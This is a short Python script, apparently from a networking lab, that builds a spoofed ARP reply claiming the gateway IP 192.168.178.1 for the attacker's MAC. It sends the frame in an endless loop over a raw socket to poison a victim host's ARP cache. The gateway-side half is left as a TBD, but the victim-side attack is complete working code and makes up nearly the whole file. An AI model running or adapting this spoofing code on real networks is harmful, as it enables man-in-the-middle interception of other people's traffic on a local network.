#!/usr/bin/env python3

#TBD: implemet attack of the gateway side

import socket

vic_mac = b'\x08\x00\x27\xf1\xe2\x18'
attk_mac = b'\x08\x00\x27\x1f\x30\x76'
arp_code = b'\x08\x06'

#victim eth: dest-src-prot
ethernet_vic = vic_mac + attk_mac + arp_code

#GW eth
ethenet_gw = b'\xaa\xaa\xaa\xaa\xaa\xaa'

#arp: HW type, prot type, HW-size, prot-size, Opcode (2 for reply),
#sender mac, sender IP (spoofed),target mac (victim),  target IP (victim) 

#HW type
hwt = b'\x00\x01'
#prot type
prot = b'\x08\x00'
#HW size
hws = b'\06'
#prot size
prots = b'\04'
#opcode for reply = 2
opcode  = b'\x00\x02'
#sender mac
sender_mac_vic = b'\x08\x00\x27\x1f\x30\x76'
#sender IP (spoofed)
sender_ip_vic = socket.inet_aton('192.168.178.1')
#target mac (victim)
target_mac_vic = b'\x08\x00\x27\xf1\xe2\x18'
#target ip (victim)
target_ip_vic = socket.inet_aton('192.168.178.26')

arp_vic = hwt + prot + hws + prots + opcode + sender_mac_vic + sender_ip_vic +\
        target_mac_vic + target_ip_vic

#pack a spoofed ARP reply frame
packet_vic = ethernet_vic + arp_vic

#send spoofed ARP reply frame

sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
sock.bind (('eth0',6))

while 1:
    #victim attack
    sock.send(packet_vic)
    #gw attack

